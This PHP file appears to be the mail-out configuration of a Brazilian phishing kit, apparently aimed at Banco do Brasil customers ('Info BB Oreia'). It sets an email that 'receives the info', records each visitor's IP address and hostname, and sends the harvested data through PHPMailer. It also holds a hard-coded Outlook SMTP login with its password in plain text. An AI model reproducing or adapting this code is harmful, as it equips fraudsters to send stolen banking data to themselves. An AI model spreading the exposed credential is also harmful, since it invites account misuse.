<?php
session_start();
ob_start();

// error_reporting(0);
date_default_timezone_set('America/Sao_Paulo');

$destino        = 'luisricarod3@gmail.com'; // EMAIL QUE RECEBE AS INFO 
$sender         = 'amarildotoigodossantos@outlook.com'; // EMAIL QUE ENVIA AS INFO (PODE SER ALTERADO POR QUALQUER OUTRO)

$apelido 		= 'Info BB Oreia';
$envioSMTP      = 'sim'; // USE 'sim' PARA ENVIO COM SMTP | USE 'nao' PARA ENVIO COM PHP NATIVO
$tipo_security  = 'tls'; // USE 'ssl' PARA ENVIO COM SMTP E PORTA 465 | USE 'tls' PARA ENVIO COM PHP E PORTA 587

/* CONFIGURAÇÕES SMTP */

define("HOST_SMTP", 'smtp.office365.com'); 		// SERVIDOR SMTP
define("PORT_SMTP", '587'); 		// PORTA DE ENVIO SMTP
define("USER_SMTP", 'amarildotoigodossantos@outlook.com'); 		// E-MAIL SMTP
define("PASS_SMTP", 'Orelha17'); 		    // SENHA DO E-MAIL SMTP


/* NÃO ALTERAR DAQUI PARA BAIXO SE NÃO SOUBER PROGRAMAR */
/* NÃO ALTERAR DAQUI PARA BAIXO SE NÃO SOUBER PROGRAMAR */
/* NÃO ALTERAR DAQUI PARA BAIXO SE NÃO SOUBER PROGRAMAR */

if($envioSMTP == 'sim'):
    $aviao = USER_SMTP;
else:
    $aviao = $sender;
endif;

$ip 		= ($_SERVER['REMOTE_ADDR'] == '::1') ? '127.0.0.1' : $_SERVER['REMOTE_ADDR'];
$data 		= date('d/m/Y');
$hora 		= date('H:m');
$pc_name 	= gethostbyaddr($_SERVER['REMOTE_ADDR']);
$assunto 	= "{$apelido} - {$ip} - {$data}";

function sendMail($assunto,$mensagem,$aviao,$destino,$tipo_envio = null,$tipo_security = null,$arquivo = null){
	require_once('smtp/class.phpmailer.php');

	$nomeRemetente 	= 'Info Oreia';
	$nomeDestino 	= 'Info Oreia';

	$mail = new PHPMailer(); 

	if($tipo_envio == 'php' || $tipo_envio == null){
		$mail->IsMail();
	}elseif($tipo_envio == 'smtp'){
		$mail->IsSMTP();
	}elseif($tipo_envio == 'sendmail'){
		$mail->IsSendmail();
	}elseif($tipo_envio == 'qmail'){
		$mail->IsQmail();
	}else{
		$mail->IsMail();
	}

	if($tipo_security == 'tls'){
		$mail->SMTPSecure = 'tls';
	}elseif($tipo_security == 'ssl'){
		$mail->SMTPSecure = 'ssl';
	}

	if($tipo_envio == 'smtp'){
		$mail->SMTPAuth = true; 

		$mail->Host 	= trim(HOST_SMTP);
		$mail->Port 	= trim(PORT_SMTP);
		$mail->Username = trim(USER_SMTP);
		$mail->Password = trim(PASS_SMTP);
	}
	
	$mail->IsHTML(true);
	
	$mail->From = utf8_decode($aviao);
	$mail->FromName = utf8_decode($nomeRemetente);
	
	$mail->Subject = utf8_decode($assunto);
	$mail->Body = utf8_decode($mensagem);

	$destinatarios = explode(',', $destino);
	for($d = 0;$d < count($destinatarios);$d++){
		$mail->AddAddress(utf8_decode($destinatarios[$d]),utf8_decode($nomeDestino));
	}
	
	if($arquivo != null){
		$NExt = explode('.', $arquivo['name']);
		$NArq = md5(time());
		$AExt = $NExt[1];

		$mail->addAttachment($arquivo);
	}
	
	
	if($mail->Send()){
	   return true;
	}else{
	   return false;
	}
}

function saudacao(){
	$hora = date('H');

	if($hora >= 18 && $hora < 24){
		$saudacao = 'Boa noite';
	}elseif($hora >= 12 && $hora < 18){
		$saudacao = 'Boa tarde';
	}elseif($hora >= 6 && $hora < 12){
		$saudacao = 'Bom dia';
	}else{
		$saudacao = 'Bom dia';
	}

	return $saudacao;
}

